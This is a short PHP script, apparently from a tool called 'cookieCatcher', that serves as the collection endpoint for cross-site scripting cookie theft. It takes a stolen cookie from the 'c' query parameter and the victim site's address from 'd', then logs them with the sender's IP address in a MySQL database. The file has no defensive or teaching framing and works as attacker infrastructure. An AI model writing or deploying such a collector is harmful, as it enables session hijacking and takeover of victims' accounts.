<?php
include('inc/configure.php');
include('inc/mysql_querylab.php');
include('inc/cookieCatcher.php');

////////////////////////////////////
## Initiate Objects/Classes
$catcher = new cookieCatcher();

////////////////////////////////////
## Initiate DB Connection
$catcher->connect($db_HOST,$db_USERNAME,$db_PASSWORD,$db_NAME);

////////////////////////////////////
## Grab cookie data and store in MySQL
$cdata = $_GET['c'];
$referer = $_GET['d'];
// Check for valid cookie data
if(isset($cdata) && $cdata != "" && isset($referer) && $referer!="") {
  $catcher->grab($_SERVER['REMOTE_ADDR'],$referer,$cdata);
}
?>
